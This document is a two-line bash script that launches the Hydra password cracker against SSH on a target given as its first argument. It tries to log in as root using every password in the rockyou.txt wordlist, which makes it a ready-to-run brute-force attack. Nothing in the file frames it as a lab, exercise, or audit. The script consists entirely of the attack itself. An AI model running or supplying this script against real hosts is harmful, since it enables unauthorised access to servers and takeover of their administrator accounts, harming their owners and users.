#!/bin/bash
/usr/app/hydra -l root -P /usr/wordlist/rockyou.txt -t 1 ssh://$1:22
